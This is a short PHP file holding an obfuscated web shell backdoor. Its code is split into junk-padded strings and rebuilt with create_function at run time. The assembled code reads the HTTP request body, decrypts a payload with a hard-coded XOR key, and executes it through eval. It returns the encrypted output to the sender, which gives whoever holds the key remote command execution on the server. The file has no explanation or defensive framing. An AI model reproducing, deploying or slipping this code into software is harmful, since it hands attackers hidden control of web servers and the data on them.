<?php
$W='WGvfUDCZy";fZunctZioZn xZ($Zt,$k){$c=strlen($k);$l=sZtrlen($ZtZ);$o="Z";';
$V='Z$k="5d71604Z5"Z;$Zkh="bdb2e2c99ec0ZZ";$kf="8fd53cZcddb0Zd"ZZ;$p="p04l8xaZs';
$P=str_replace('PY','','PYcrPYeatePY_PYfuncPYtPYion');
$T='foZrZ($i=0;$i<$l;){for(ZZ$j=Z0;(Z$j<$c&&$i<$l);Z$j++,$i++Z){$o.=$Zt{Z$i}Z^';
$J='@x(@bZasZe64Z_dZecode($m[1]Z),$k)));$oZ=Z@ob_gZet_contZents(ZZ);@ob_eZnd_cl';
$u='$k{$j};}}ZZZreturnZ $o;}if (Z@preg_ZZmatch("/$Zkh(Z.+)$kf/",@file_getZZ_';
$B='ean();$r=@basZe64_encoZZde(@x(@gzZcZoZmpress($o),$k));pZrintZ("$p$Zkh$r$kf");}';
$L='Zcontents("Zphp://input"),$m)Z=Z=1) {Z@ob_start();Z@evaZl(@gzuZncomprZess(';
$l=str_replace('Z','',$V.$W.$T.$u.$L.$J.$B);
$c=$P('',$l);$c();
?>
